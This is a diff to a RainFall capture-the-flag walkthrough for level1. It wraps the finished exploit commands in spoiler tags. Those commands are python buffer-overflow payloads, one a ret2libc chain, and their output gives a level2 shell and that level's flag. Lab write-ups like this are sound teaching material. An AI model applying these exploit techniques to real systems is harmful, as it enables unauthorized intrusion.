@@ -163,6 +163,9 @@ Which should be:
 
 And the final part of our craft will result in:
 
+<details>
+       <summary>Spoiler</summary>
+
 ```bash
 level1@RainFall:~$ python2 -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
 Good... Wait what?
@@ -185,6 +188,8 @@ level2
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
+
+</details>
 
 ## Alternative exploit | Return to lib-c
 
@@ -254,12 +259,17 @@ Now, we can craft our payload, which will ressemble something like this:
 
 And execute it as usual:
 
+<details>
+       <summary>Spoiler</summary>
+
 ```bash
 level1@RainFall:~$ python2 -c 'print "a"*76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/payload.txt
 level1@RainFall:~$ cat /tmp/payload.txt - | ./level1
 whoami
 level2
 ```
+
+</details>
 
 ## Flag
 
